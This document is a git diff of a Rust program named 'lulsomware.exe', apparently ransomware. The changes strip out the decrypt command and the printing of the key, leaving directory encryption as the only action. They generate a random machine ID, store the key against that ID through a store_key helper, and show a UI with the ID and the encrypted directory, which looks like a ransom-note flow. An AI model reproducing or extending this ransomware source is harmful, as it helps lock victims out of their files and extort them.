@@ -3,6 +3,9 @@ use std::fmt::{Display, Formatter, Result};
 use std::fs;
 use std::fs::OpenOptions;
 use std::process::exit;
+use uuid::Uuid;
+
+use crate::key_utils::store_key;
 
 mod key_utils;
 mod encryption;
@@ -23,35 +26,25 @@ impl Display for Action {
 }
 
 fn main() {
-    let machine_id = "f8ed-fade-c30e";
-    ui::render_ui(machine_id);
-
+    let machine_id = Uuid::new_v4();
     let args: Vec<String> = env::args().collect();
 
     if args.len() < 2 {
         exit_with_help();
     }
 
-    let action = args[1].as_str();
     let working_directory = args[2].as_str();
+    let encryption_key = key_utils::set_encryption_key(&args);
 
-    match action {
-        "encrypt" => {
-            let encryption_key = key_utils::set_encryption_key(&args);
-            if encryption_key.len() != 32 {
-                eprintln!("Please provide a valid 32-long char-utf8 as a custom key");
-                exit_with_help();
-            }
-            perform_action_on_directory(&encryption_key, &Action::Encrypt, working_directory);
-            println!("\n\n🔑 {}", encryption_key);
-        }
-        "decrypt" => {
-            let encryption_key = key_utils::set_encryption_key(&args);
-            perform_action_on_directory(&encryption_key, &Action::Decrypt, working_directory);
-            println!("Done decrypting chief");
-        }
-        _ => exit_with_help(),
+    if encryption_key.len() != 32 {
+        eprintln!("Please provide a valid 32-long char-utf8 as a custom key");
+        exit_with_help();
     }
+    perform_action_on_directory(&encryption_key, &Action::Encrypt, working_directory);
+
+    store_key(&machine_id, &encryption_key);
+
+    ui::render_ui(&machine_id, &working_directory);
 }
 
 fn perform_action_on_directory(encryption_key: &String, action: &Action, working_directory: &str) {
@@ -82,7 +75,6 @@ fn perform_action_on_directory(encryption_key: &String, action: &Action, working
 }
 
 fn exit_with_help() {
-    eprintln!("Encrypt: lulsomware.exe encrypt [directory]");
-    eprintln!("Decrypt: lulsomware.exe decrypt [directory] [key]");
+    eprintln!("Encrypt: lulsomware.exe [directory]");
     exit(1);
 }
